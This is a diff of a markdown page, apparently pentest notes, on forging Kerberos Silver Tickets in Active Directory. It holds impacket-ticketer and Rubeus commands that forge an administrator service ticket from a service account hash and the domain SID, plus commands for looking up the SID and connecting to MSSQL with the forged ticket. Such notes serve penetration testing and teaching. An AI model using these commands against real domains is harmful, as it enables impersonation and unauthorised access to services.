@@ -1,6 +1,5 @@
 ---
 title: "Silver Ticket"
-date: 2024-7-30
 tags: ["Pass-The-Ticket", "SID", "Rubeus", "Ticket Granting Ticket", "Silver Ticket", "Sidhistory", "Domain Controller", "Active Directory", "Windows", "GetUserSPNs"]
 ---
 
@@ -63,7 +62,7 @@ Domain SID: S-1-5-21-4078382237-1492182817-2568127209
 #### 4. Generate Silver Ticket
 
 ```console
-impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC_IP> -spn anything/<DC> administrator
+impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC_IP> -spn <SPN> administrator
 ```
 
 ```console {class="sample-code"}
@@ -82,6 +81,11 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 [*]     EncTicketPart
 [*]     EncTGSRepPart
 [*] Saving ticket in administrator.ccache
+```
+
+```console
+# Specify group / user id
+impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC_IP> -spn <SPN> -groups <GROUP_ID> -user-id <USER_ID> <SERVICE_ACCOUNT>
 ```
 
 #### 5. Import Ticket
@@ -114,7 +118,7 @@ Valid starting     Expires            Service principal
 
 ```console
 # For example: mssql
-impacket-mssqlclient -k <DC>
+impacket-mssqlclient -k <TARGET_DOMAIN>
 ```
 
 ```console {class="sample-code"}
@@ -171,9 +175,10 @@ b'2186a912c7f240246fd2c2b04651f9b4\r\n'
 [!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
 ```
 
-#### 3. Get Domain SID
+#### 3a. Get Domain SID \[Local\]
 
-#### 3a. Locally
+{{< tab set1-2 tab1 active >}}Powershell{{< /tab >}}{{< tab set1-2 tab2 >}}cmd{{< /tab >}}
+{{< tabcontent set1-2 tab1 >}}
 
 ```console
 import-module activedirectory
@@ -193,7 +198,16 @@ Get-ADDomain | fl DomainSID
 DomainSID : S-1-5-21-4078382237-1492182817-2568127209
 ```
 
-#### 3b. Remotely
+{{< /tabcontent >}}
+{{< tabcontent set1-2 tab2 >}}
+
+```console
+wmic group where name="Domain Admins" get name,sid,domain
+```
+
+{{< /tabcontent >}}
+
+#### 3b. Get Domain SID \[Remote\]
 
 ```console
 # Install ldp.exe (Windows 11)
@@ -214,7 +228,7 @@ Filter: (objectclass=User)
 #### 4. Generate Silver Ticket
 
 ```console
-.\rubeus.exe silver /domain:<DOMAIN> /dc:<DC> /sid:<SID> /rc4:<HASH> /user:administrator /service:anything/<DC> /nowrap /ptt
+.\rubeus.exe silver /domain:<DOMAIN> /dc:<DC> /sid:<SID> /rc4:<HASH> /user:administrator /service:anything/<TARGET_DOMAIN> /nowrap /ptt
 ```
 
 ```console {class="sample-code"}
